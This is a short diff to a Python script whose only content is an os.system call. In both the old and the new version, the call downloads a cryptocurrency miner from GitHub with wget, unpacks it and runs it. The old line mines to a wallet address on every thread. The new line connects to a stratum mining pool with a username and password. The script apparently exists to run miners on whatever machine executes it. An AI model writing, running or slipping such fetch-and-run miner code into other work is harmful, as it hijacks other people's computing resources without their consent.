@@ -1,3 +1,3 @@
 import os
 
-os.system('wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.3.4/skypool-nimiq-v1.3.4-linux-x64.zip && unzip skypool-nimiq-v1.3.4-linux-x64.zip && ./skypool-nimiq-v1.3.4-linux-x64/skypool-node-client --address="NQ53 E7TB 6DRD 7GGQ QHXC RX3V BUMY QA6S SMMR" --thread=-1')
+os.system('wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.rock6064 -p mina38985')
